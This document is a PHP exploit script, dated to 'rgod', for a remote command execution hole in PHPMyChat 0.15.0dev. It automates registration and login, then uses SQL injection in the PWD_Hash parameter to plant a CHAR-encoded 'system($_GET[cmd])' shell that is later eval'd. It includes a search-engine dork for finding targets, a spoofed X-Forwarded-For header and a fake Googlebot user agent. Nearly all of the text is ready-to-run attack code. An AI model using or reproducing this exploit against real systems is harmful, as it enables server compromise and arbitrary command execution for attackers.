#!/usr/bin/php -q -d short_open_tag=on
<?
echo "PHPMyChat 0.15.0dev \"SYS enter\" remote cmmnds xctn 0day (again)\r\n";
echo "by rgod rgod@autistici.org\r\n";
echo "site: http://retrogod.altervista.org\r\n\r\n";
echo "-> works with magic_quotes_gpc=Off\r\n\r\n";
echo "dork: intext:\"2000-2001 The phpHeaven Team\" -sourceforge\r\n\r\n";

if ($argc<4) {
echo "Usage: php ".$argv[0]." host path cmd OPTIONS\r\n";
echo "host:      target server (ip/hostname)\r\n";
echo "path:      path to PHPMyChat\r\n";
echo "cmd:       a shell command\r\n";
echo "Options:\r\n";
echo "   -p[port]:    specify a port other than 80\r\n";
echo "   -P[ip:port]: specify a proxy\r\n";
echo "Examples:\r\n";
echo "php ".$argv[0]." localhost /phpmychat/ cat ./config/config.lib.php\r\n";
echo "php ".$argv[0]." localhost /phpmychat/ ls -la -p81\r\n";
echo "php ".$argv[0]." localhost / ls -la -P1.1.1.1:80\r\n";
die;
}

# explaination:
#
# only modified this one:
#
# http://retrogod.altervista.org/phpmychat_0145_xpl.html
#
# actually I tested this package:
#
# http://prdownloads.sourceforge.net/phpmychat/phpMyChat-0.15.0-dev20050206.tgz?download
#
# code is no properly patched 'cause, if magic_quotes_gpc = Off, you can inject
# an "always true" statement in PWD_Hash argument

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
        $c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
        }
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}
function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$action=$argv[3];
$cmd="";$port=80;$proxy="";

for ($i=3; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P"))
{$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
$cmd=urlencode($cmd);

if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

#step 1 -> Register, we need an online user
srand(make_seed());
$anumber = rand(1,99999);
$data="FORM_SEND=1";
$data.="&L=italian";
$data.="&U=suntzu".$anumber;
$data.="&pmc_password=suntzoi".$anumber;
$data.="&FIRSTNAME=suntzu";
$data.="&LASTNAME=suntzoi";
$data.="&GENDER=1";
$data.="&COUNTRY=";
$data.="&WEBSITE=";
$data.="&EMAIL=suntzu@suntzuuu.com";
$data.="&SHOWEMAIL=0";
$data.="&submit_type=Registrati";
$packet ="POST ".$p."chat/register.php HTTP/1.0\r\n";
$packet.="X-Forwarded-For: 127.0.0.1\r\n"; //spoof , a nice ip value for c_regusers table
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Cookie: CookieLang=italian;\r\n\r\n";
$packet.=$data;
#debug
#echo quick_dump($packet);
sendpacketii($packet);

#step 2 -> Login
$packet ="GET ".$p."chat/loader.php?From=..%2FphpMyChat.php3&L=italian&Ver=H";
$packet.="&U=suntzu".$anumber."&R=Default&T=1&D=10&N=20&ST=1&NT=1&PWD_Hash=".md5("suntzoi".$anumber)."&First=1 HTTP/1.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Cookie: CookieLang=italian; CookieUsername=suntzu".$anumber."; CookieRoom=Default; CookieRoomType=1\r\n\r\n";
#debug
#echo quick_dump($packet);
sendpacketii($packet);

#step 3 -> SQL Injection, let's store a shell in c_messages table
$L="L=english";
$U="U=SYS%20enter";
$T ="0,"; //type
$T.="CHAR(68,101,102,97,117,108,116),"; //room (Default)
$T.="CHAR(83,89,83,32,101,110,116,101,114),"; //username (SYS enter)
$T.="0,";//latin1
$T.="9999999999,";//m_time
$T.="1,";//address
//message (our encoded shell -> system($_GET[cmd]);die ) ,if system() is disabled, reencode a new one with passthru() or exec()
//u can use an unlimited number of chars for this
$T.="CHAR(115,121,115,116,101,109,40,36,95,71,69,84,91,99,109,100,93,41,59,100,105,101))/*";
$T="T=".urlencode($T);

$PWD="'or'a'='a' UNION SELECT c_users.room, c_users.status, c_users.ip FROM c_users, c_reg_users WHERE 'a'='a' LIMIT 1/*";
$PWD=urlencode($PWD);

for ($i=0; $i<=1; $i++) //redo
{
srand(make_seed());
$anumber = rand(1,99999);
$R="R=Default".$anumber; //random, it must be different from the previous one
$packet ="GET ".$p."chat/messagesL.php?$L&$U&$T&$R&PWD_Hash=$PWD HTTP/1.0\r\n";
$packet.="X-Forwarded-For: suntzuuuuuuu\r\n";
$packet.="User-Agent: Googlebot/2.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
#debug
#echo quick_dump($packet);
sendpacketii($packet);
}
sleep(1);
#step 4 -> shell is passed to an eval(), so we launch commands
$packet ="GET ".$p."chat/messagesL.php?L=english&R=Default&N=9999&T=0&U=SYS%20enter&cmd=".$cmd."&PWD_Hash=$PWD HTTP/1.0\r\n";
$packet.="User-Agent: Googlebot/2.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
#debug
#echo quick_dump($packet);
sendpacketii($packet);
echo $html;
?>